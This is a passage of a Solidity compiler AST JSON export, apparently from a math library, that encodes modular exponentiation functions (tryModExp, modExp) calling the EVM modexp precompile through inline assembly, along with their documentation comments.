tr","nativeSrc":"18249:3:6","nodeType":"YulIdentifier","src":"18249:3:6"},{"kind":"number","nativeSrc":"18254:4:6","nodeType":"YulLiteral","src":"18254:4:6","type":"","value":"0xa0"}],"functionName":{"name":"add","nativeSrc":"18245:3:6","nodeType":"YulIdentifier","src":"18245:3:6"},"nativeSrc":"18245:14:6","nodeType":"YulFunctionCall","src":"18245:14:6"},{"name":"m","nativeSrc":"18261:1:6","nodeType":"YulIdentifier","src":"18261:1:6"}],"functionName":{"name":"mstore","nativeSrc":"18238:6:6","nodeType":"YulIdentifier","src":"18238:6:6"},"nativeSrc":"18238:25:6","nodeType":"YulFunctionCall","src":"18238:25:6"},"nativeSrc":"18238:25:6","nodeType":"YulExpressionStatement","src":"18238:25:6"},{"nativeSrc":"18425:57:6","nodeType":"YulAssignment","src":"18425:57:6","value":{"arguments":[{"arguments":[],"functionName":{"name":"gas","nativeSrc":"18447:3:6","nodeType":"YulIdentifier","src":"18447:3:6"},"nativeSrc":"18447:5:6","nodeType":"YulFunctionCall","src":"18447:5:6"},{"kind":"number","nativeSrc":"18454:4:6","nodeType":"YulLiteral","src":"18454:4:6","type":"","value":"0x05"},{"name":"ptr","nativeSrc":"18460:3:6","nodeType":"YulIdentifier","src":"18460:3:6"},{"kind":"number","nativeSrc":"18465:4:6","nodeType":"YulLiteral","src":"18465:4:6","type":"","value":"0xc0"},{"kind":"number","nativeSrc":"18471:4:6","nodeType":"YulLiteral","src":"18471:4:6","type":"","value":"0x00"},{"kind":"number","nativeSrc":"18477:4:6","nodeType":"YulLiteral","src":"18477:4:6","type":"","value":"0x20"}],"functionName":{"name":"staticcall","nativeSrc":"18436:10:6","nodeType":"YulIdentifier","src":"18436:10:6"},"nativeSrc":"18436:46:6","nodeType":"YulFunctionCall","src":"18436:46:6"},"variableNames":[{"name":"success","nativeSrc":"18425:7:6","nodeType":"YulIdentifier","src":"18425:7:6"}]},{"nativeSrc":"18495:21:6","nodeType":"YulAssignment","src":"18495:21:6","value":{"arguments":[{"kind":"number","nativeSrc":"18511:4:6","nodeType":"YulLiteral","src":"18511:4:6","type":"","value":"0x00"}],"functionName":{"name":"mload","nativeSrc":"18505:5:6","nodeType":"YulIdentifier","src":"18505:5:6"},"nativeSrc":"18505:11:6","nodeType":"YulFunctionCall","src":"18505:11:6"},"variableNames":[{"name":"result","nativeSrc":"18495:6:6","nodeType":"YulIdentifier","src":"18495:6:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2875,"isOffset":false,"isSlot":false,"src":"18185:1:6","valueSize":1},{"declaration":2877,"isOffset":false,"isSlot":false,"src":"18223:1:6","valueSize":1},{"declaration":2879,"isOffset":false,"isSlot":false,"src":"18261:1:6","valueSize":1},{"declaration":2884,"isOffset":false,"isSlot":false,"src":"18495:6:6","valueSize":1},{"declaration":2882,"isOffset":false,"isSlot":false,"src":"18425:7:6","valueSize":1}],"flags":["memory-safe"],"id":2894,"nodeType":"InlineAssembly","src":"17088:1438:6"}]},"documentation":{"id":2873,"nodeType":"StructuredDocumentation","src":"16191:738:6","text":" @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\n It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\n to operate modulo 0 or if the underlying precompile reverted.\n IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\n you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\n https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\n of a revert, but the result may be incorrectly interpreted as 0."},"id":2896,"implemented":true,"kind":"function","modifiers":[],"name":"tryModExp","nameLocation":"16943:9:6","nodeType":"FunctionDefinition","parameters":{"id":2880,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2875,"mutability":"mutable","name":"b","nameLocation":"16961:1:6","nodeType":"VariableDeclaration","scope":2896,"src":"16953:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2874,"name":"uint256","nodeType":"ElementaryTypeName","src":"16953:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2877,"mutability":"mutable","name":"e","nameLocation":"16972:1:6","nodeType":"VariableDeclaration","scope":2896,"src":"16964:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2876,"name":"uint256","nodeType":"ElementaryTypeName","src":"16964:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2879,"mutability":"mutable","name":"m","nameLocation":"16983:1:6","nodeType":"VariableDeclaration","scope":2896,"src":"16975:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2878,"name":"uint256","nodeType":"ElementaryTypeName","src":"16975:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"16952:33:6"},"returnParameters":{"id":2885,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2882,"mutability":"mutable","name":"success","nameLocation":"17014:7:6","nodeType":"VariableDeclaration","scope":2896,"src":"17009:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2881,"name":"bool","nodeType":"ElementaryTypeName","src":"17009:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2884,"mutability":"mutable","name":"result","nameLocation":"17031:6:6","nodeType":"VariableDeclaration","scope":2896,"src":"17023:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2883,"name":"uint256","nodeType":"ElementaryTypeName","src":"17023:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"17008:30:6"},"scope":3686,"src":"16934:1598:6","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":2931,"nodeType":"Block","src":"18729:179:6","statements":[{"assignments":[2909,2911],"declarations":[{"constant":false,"id":2909,"mutability":"mutable","name":"success","nameLocation":"18745:7:6","nodeType":"VariableDeclaration","scope":2931,"src":"18740:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2908,"name":"bool","nodeType":"ElementaryTypeName","src":"18740:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2911,"mutability":"mutable","name":"result","nameLocation":"18767:6:6","nodeType":"VariableDeclaration","scope":2931,"src":"18754:19:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2910,"name":"bytes","nodeType":"ElementaryTypeName","src":"18754:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":2917,"initialValue":{"arguments":[{"id":2913,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2899,"src":"18787:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":2914,"name":"e","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2901,"src":"18790:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":2915,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2903,"src":"18793:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":2912,"name":"tryModExp","nodeType":"Identifier","overloadedDeclarations":[2896,2978],"referencedDeclaration":2978,"src":"18777:9:6","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_bytes_memory_ptr_$_t_bytes_memory_ptr_$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$","typeString":"function (bytes memory,bytes memory,bytes memory) view returns (bool,bytes memory)"}},"id":2916,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18777:18:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"nodeType":"VariableDeclarationStatement","src":"18739:56:6"},{"condition":{"id":2919,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"18809:8:6","subExpression":{"id":2918,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2909,"src":"18810:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2928,"nodeType":"IfStatement","src":"18805:74:6","trueBody":{"id":2927,"nodeType":"Block","src":"18819:60:6","statements":[{"expression":{"arguments":[{"expression":{"id":2923,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"18845:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2924,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"18851:16:6","memberName":"DIVISION_BY_ZERO","nodeType":"MemberAccess","referencedDeclaration":196,"src":"18845:22:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":2920,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"18833:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Panic_$229_$","typeString":"type(library Panic)"}},"id":2922,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"18839:5:6","memberName":"panic","nodeType":"MemberAccess","referencedDeclaration":228,"src":"18833:11:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$__$","typeString":"function (uint256) pure"}},"id":2925,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"18833:35:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":2926,"nodeType":"ExpressionStatement","src":"18833:35:6"}]}},{"expression":{"id":2929,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2911,"src":"18895:6:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":2907,"id":2930,"nodeType":"Return","src":"18888:13:6"}]},"documentation":{"id":2897,"nodeType":"StructuredDocumentation","src":"18538:85:6","text":" @dev Variant of {modExp} that supports inputs of arbitrary length."},"id":2932,"implemented":true,"kind":"function","modifiers":[],"name":"modExp","nameLocation":"18637:6:6","nodeType":"FunctionDefinition","parameters":{"id":2904,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2899,"mutability":"mutable","name":"b","nameLocation":"18657:1:6","nodeType":"VariableDeclaration","scope":2932,"src":"18644:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2898,"name":"bytes","nodeType":"ElementaryTypeName","src":"18644:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":2901,"mutability":"mutable","name":"e","nameLocation":"18673:1:6","nodeType":"VariableDeclaration","scope":2932,"src":"18660:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2900,"name":"bytes","nodeType":"ElementaryTypeName","src":"18660:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":2903,"mutability":"mutable","name":"m","nameLocation":"18689:1:6","nodeType":"VariableDeclaration","scope":2932,"src":"18676:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2902,"name":"bytes","nodeType":"ElementaryTypeName","src":"18676:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"18643:48:6"},"returnParameters":{"id":2907,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2906,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2932,"src":"18715:12:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2905,"name":"bytes","nodeType":"ElementaryTypeName","src":"18715:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"18714:14:6"},"scope":3686,"src":"18628:280:6","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":2977,"nodeType":"Block","src":"19162:771:6","statements":[{"condition":{"arguments":[{"id":2947,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2939,"src":"19187:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":2946,"name":"_zeroBytes","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3011,"src":"19176:10:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$returns$_t_bool_$","typeString":"function (bytes memory) pure returns (bool)"}},"id":2948,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19176:13:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2956,"nodeType":"IfStatement","src":"19172:47:6","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":2949,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"19199:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"arguments":[{"hexValue":"30","id":2952,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"19216:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":2951,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"19206:9:6","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$","typeString":"function (uint256) pure returns (bytes memory)"},"typeName":{"id":2950,"name":"bytes","nodeType":"ElementaryTypeName","src":"19210:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}}},"id":2953,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19206:12:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"id":2954,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"19198:21:6","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_bytes_memory_ptr_$","typeString":"tuple(bool,bytes memory)"}},"functionReturnParameters":2945,"id":2955,"nodeType":"Return","src":"19191:28:6"}},{"assignments":[2958],"declarations":[{"constant":false,"id":2958,"mutability":"mutable","name":"mLen","nameLocation":"19238:4:6","nodeType":"VariableDeclaration","scope":2977,"src":"19230:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2957,"name":"uint256","nodeType":"ElementaryTypeName","src":"19230:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2961,"initialValue":{"expression":{"id":2959,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2939,"src":"19245:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2960,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"19247:6:6","memberName":"length","nodeType":"MemberAccess","src":"19245:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"19230:23:6"},{"expression":{"id":2974,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2962,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2944,"src":"19335:6:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"expression":{"id":2965,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2935,"src":"19361:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2966,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"19363:6:6","memberName":"length","nodeType":"MemberAccess","src":"19361:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"id":2967,"name":"e","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2937,"src":"19371:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2968,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"19373:6:6","memberName":"length","nodeType":"MemberAccess","src":"19371:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2969,"name":"mLen","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2958,"src":"19381:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2970,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2935,"src":"19387:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":2971,"name":"e","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2937,"src":"19390:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":2972,"name":"m","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2939,"src":"19393:1:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":2963,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"19344:3:6","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":2964,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"19348:12:6","memberName":"encodePacked","nodeType":"MemberAccess","src":"19344:16:6","typeDescriptions":{"typeIdentifier":"t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":2973,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"19344:51:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"src":"19335:60:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2975,"nodeType":"ExpressionStatement","src":"19335:60:6"},{"AST":{"nativeSrc":"19431:496:6","nodeType":"YulBlock","src":"19431:496:6","statements":[{"nativeSrc":"19445:32:6","nodeType":"YulVariableDeclaration","src":"19445:32:6","value":{"arguments":[{"name":"result","nativeSrc":"19464:6:6","nodeType":"YulIdentifier","src":"19464:6:6"},{"kind":"number","nativeSrc":"19472:4:6","nodeType":"YulLiteral","src":"19472:4:6","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"19460:3:6","nodeType":"YulIdentifier","src":"19460:3:6"},"nativeSrc":"19460:17:6","nodeType":"YulFunctionCall","src":"19460:17:6"},"variables":[{"name":"dataPtr","nativeSrc":"19449:7:6","nodeType":"YulTypedName","src":"19449:7:6","type":""}]},{"nativeSrc":"19567:73:6","nodeType":"YulAssignment","src":"19567:73:6","value":{"arguments":[{"arguments":[],"functionName":{"name":"gas","nativeSrc":"19589:3:6","nodeType":"YulIdentifier","src":"19589:3:6"},"nativeSrc":"19589:5:6","nodeType":"YulFunctionCall","src":"19589:5:6"},{"kind":"number","nativeSrc":"19596:4:6","nodeType":"YulLiteral","src":"19596:4:6","type":"","value":"0x05"},{"name":"dataPtr","nativeSrc":"19602:7:6","nodeType":"YulIdentifier","src":"19602:7:6"},{"arguments":[{"name":"result","nativeSrc":"19617:6:6","nodeType":"YulIdentifier","src":"19617:6:6"}],"functionName":{"name":"mload","nativeSrc":"19611:5:6","nodeType":"YulIdentifier","src":"19611:5:6"},"nativeSrc":"19611:13:6","nodeType":"YulFunctionCall","src":"19611:13:6"},{"name":"dataPtr","nativeSrc":"19626:7:6","nodeType":"YulIdentifier","src":"19626:7:6"},{"name":"mLen","nativeSrc":"19635:4:6","nodeType":"YulIdentifier","src":"19635:4:6"}],"functionName":{"name":"staticcall","nativeSrc":"19578:10:6","nodeType":"YulIdentifier","src":"19578:10:6"},"nativeSrc":"19578:62:6","nodeType":"YulFunctionCall","src":"19578:62:6"},"variableNames":[{"name":"success","nativeSrc":"19567:7:6","nodeType":"YulIdentifier","src":"19567:7:6"}]},{"expression":{"arguments":[{"name":"result","nativeSrc":"19796:6:6","nodeType":"YulIdentifier","src":"19796:6:6"},{"name":"mLen","nativeSrc":"19804:4:6","nodeType":"YulIdentifier","src":"19804:4:6"}],"functionName":{"name":"mstore","nativeSrc":"19789:6:6","nodeType":"YulIdentifier","src":"19789:6:6"},"nativeSrc":"19789:20:6","nodeType":"YulFunctionCall","src":"19789:20:6"},"nativeSrc":"19789:20:6","nodeType":"YulExpressionStatement","src":"19789:20:6"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"19892:4:6","nodeType":"YulLiteral","src":"19892:4:6","type":"","value":"0x40"},{"arguments":[{"name":"dataPtr","nativeSrc":"19902:7:6","nodeType":"YulIdentifier","src":"19902:7:6"},{"name":"mLen","nativeSrc":"19911:4:6","nodeType":"YulIdentifier","src":"19911:4:6"}],"functionName":{"name":"add","nativeSrc":"19898:3:6","nodeType":"YulIdentifier","src":"19898:3:6"},"nativeSrc":"19898:18:6","nodeType":"YulFunctionCall","src":"19898:18:6"}],"functionName":{"name":"mstore","nativeSrc":"19885:6:6","nodeType":"YulIdentifier","src":"19885:6:6"},"nativeSrc":"19885:32:6","nodeType":"YulFunctionCall","src":"19885:32:6"},"nativeSrc":"19885:32:6","nodeType":"YulExpressionStatement","src":"19885:32:6"}]},"evmVersion":"paris","externalReferences":[{"declaration":2958,"isOffset":false,"isSlot":false,"src":"19635:4:6","valueSize":1},{"declaration":2958,"isOffset":false,"isSlot":false,"src":"19804:4:6","valueSize":1},{"declaration":2958,"isOffset":false,"isSlot":false,"src":"19911:4:6","valueSize":1},{"declaration":2944,"isOffset":false,"isSlot":false,"src":"19464:6:6","valueSize":1},{"declaration":2944,"isOffset":false,"isSlot":false,"src":"19617:6:6","valueSize":1},{"declaration":2944,"isOffset":false,"isSlot":false,"src":"19796:6:6","valueSize":1},{"declaration":2942,"isOffset":false,"isSlot":false,"src":"19567:7:6","valueSize":1}],"flags":["memory-safe"],"id":2976,"nodeType":"InlineAssembly","src":"19406:521:6"}]},"documentation":{"id":2933,"nodeType":"StructuredDocumentation","src":"18914:88:6","text":" @dev Variant of {tryModExp} that supports inputs of arbitrary length."},"id":2978,"implemented":true,"kind":"function","modifiers":[],"name":"tryModExp","nameLocation":"19016:9:6","nodeType":"FunctionDefinition","parameters":{"id":2940,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2935,"mutability":"mutable","name":"b","nameLocation":"19048:1:6","nodeType":"VariableDeclaration","scope":2978,"src":"19035:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2934,"name":"bytes","nodeType":"ElementaryTypeName","src":"19035:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":2937,"mutability":"mutable","name":"e","nameLocation":"19072:1:6","nodeType":"VariableDeclaration","scope":2978,"src":"19059:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2936,"name":"bytes","nodeType":"ElementaryTypeName","src":"19059:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":2939,"mutability":"mutable","name":"m","nameLocation":"19096:1:6","nodeType":"VariableDeclaration","scope":2978,"src":"19083:14:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2938,"name":"bytes","nodeType":"ElementaryTypeName","src":"19083:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"19025:78:6"},"returnParameters":{"id":2945,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2942,"mutability":"mutable","name":"success","nameLocation":"19132:7:6","nodeType":"VariableDeclaration","scope":2978,"src":"19127:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2941,"name":"bool","nodeType":"ElementaryTypeName","src":"19127:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2944,"mutability":"mutable","name":"result","nameLocation":"19154:6:6","nodeType":"VariableDeclaration","scope":2978,"src":"19141:19:6","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2943,"name":"bytes","nodeType":"ElementaryTypeName","src":"19141:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"19126:35:6"},"scope":3686,"src":"19007:926:6","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":3010,"nodeType":"Block","src":"20088:176:6","statements":[{"body":{"id":3006,"nodeType":"Block","src":"20145:92:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bytes1","typeString":"bytes1"},"id":3001,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"baseExpression":{"id":2997,"name":"byteArray","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2981,"src":"20163:9:6","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":2999,"indexExpression":{"id":2998,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2987,"src":"20173:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"20163:12:6","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"hexValue":"30","id":3000,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"20179:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 